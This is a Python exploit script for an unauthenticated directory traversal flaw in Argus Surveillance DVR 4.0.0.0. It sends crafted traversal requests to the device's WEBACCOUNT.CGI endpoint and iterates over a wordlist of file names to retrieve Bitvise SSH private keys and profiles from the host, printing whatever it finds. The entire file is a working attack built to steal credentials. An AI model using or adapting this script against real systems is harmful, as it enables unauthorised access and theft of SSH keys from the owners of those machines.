#!/usr/bin/python3

# Exploit: Argus Surveillance DVR 4.0.0.0 - Directory Traversal
# Vendor: www.argussurveillance.com
#
# Description:
# This script uses the Argus Surveillance DVR 4.0.0.0 exploit that allows Unauthenticated Directory Traversal to  
# iterate over a names file to check for SSH keys in Bitvise.
import argparse
import requests

def name_list(filename):
    """ Splits a file of possible key names. """

    names = []

    with open(filename, 'r') as file:
        names = file.readlines()

    return names


def format_standard(filename_list):
    """ Format filename input taken from a text file. """
    formatted_filename_list = []

    for filename in filename_list:
        formatted_filename = filename.strip("\n")
        formatted_filename_list.append(formatted_filename)

    return formatted_filename_list


def create_payload(ip, path, filename):
    """ Create the LFI payload. """

    url = "http://" + ip + ":8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE="
    LFI = "../../../../../../../../../../../../../../../../"
    QUERY = "&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="

    return url + LFI + path + filename + QUERY


def create_profile_name(filename_list):
    profile_filenames = []

    for name in filename_list:
        if "." in name:
            new_name = name.replace(".", ".bscp")
        else:
            new_name = name + ".bscp"
        profile_filenames.append(new_name)

    return profile_filenames


def search_global_keypairs(ip, filenames):
    """ Search global keypairs in bitvise directory. """

    path = "Windows/System32/Config/Software/Bitvise/Keypairs/"

    for name in filenames:
        payload = create_payload(ip, path, name)
        response = requests.get(payload)
        if response.status_code == 200:
            if "<HTML>" not in response.text:
                print(response.text)



def search_ssh_profiles(ip, filenames):
    """ Search ssh profiles in bitvise directory. """

    path = "Users/Administrator/SSH/"

    for name in filenames:
        payload = create_payload(ip, path, name)
        response = requests.get(payload)
        if response.status_code == 200:
            if "<HTML>" not in response.text:
                print(response.text)



def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", help="ip of target.")
    parser.add_argument("filename", help="filename of possible ssh key file names.")
    args = parser.parse_args()

    names_as_list = name_list(args.filename)
    formatted_names = format_standard(names_as_list)
    #search_global_keypairs(args.ip, formatted_names)
    profile_names = create_profile_name(formatted_names)
    search_ssh_profiles(args.ip, profile_names)

if __name__ == "__main__":
    main()
